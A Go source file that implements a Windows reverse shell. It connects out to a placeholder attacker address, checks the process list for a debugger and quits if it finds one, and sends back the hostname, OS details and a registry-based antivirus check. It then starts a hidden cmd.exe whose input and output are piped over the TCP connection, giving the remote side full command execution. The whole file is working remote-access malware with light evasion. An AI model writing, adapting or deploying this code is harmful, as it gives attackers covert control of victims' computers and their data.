package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

func isDebuggerPresent() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error checking for debugger:", err)
		return false
	}

	return strings.Contains(string(output), "Debugger")
}

func getSystemInfo() string {
	// Get hostname
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		return ""
	}

	// Get operating system version
	osVersion := fmt.Sprintf("Operating System Version: %s %s\n", runtime.GOOS, runtime.GOARCH)

	// Query antivirus information (Windows Defender for this example)
	cmd := exec.Command("reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\QualityCompat", "/v", "cadca5fe-87d3-4b96-b7fb-a231484277cc")
	output, err := cmd.CombinedOutput()
	antivirusInfo := "Antivirus: Unknown"
	if err == nil && strings.Contains(string(output), "0x0") {
		antivirusInfo = "Antivirus: Windows Defender"
	}

	return fmt.Sprintf("Hostname: %s\n%s%s", hostname, osVersion, antivirusInfo)
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	// Get system information
	systemInfo := getSystemInfo()

	// Send system information to the client
	_, err := conn.Write([]byte(systemInfo))
	if err != nil {
		fmt.Println("Error sending data to client:", err)
		return
	}

	// Spawn a command prompt and redirect input/output to the TCP connection
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()

	fmt.Println("Command prompt session closed.")
}

func main() {
	serverAddr := "IP_ADDRESS:PORT"

	// Connect to the TCP server
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		fmt.Println("Error connecting to TCP server:", err)
		return
	}
	defer conn.Close()

	// Check for debugger presence
	if isDebuggerPresent() {
		fmt.Println("Debugger detected! Terminating...")
		return
	}

	fmt.Println("System information sent to", serverAddr)

	// Handle the connection
	handleClient(conn)
}
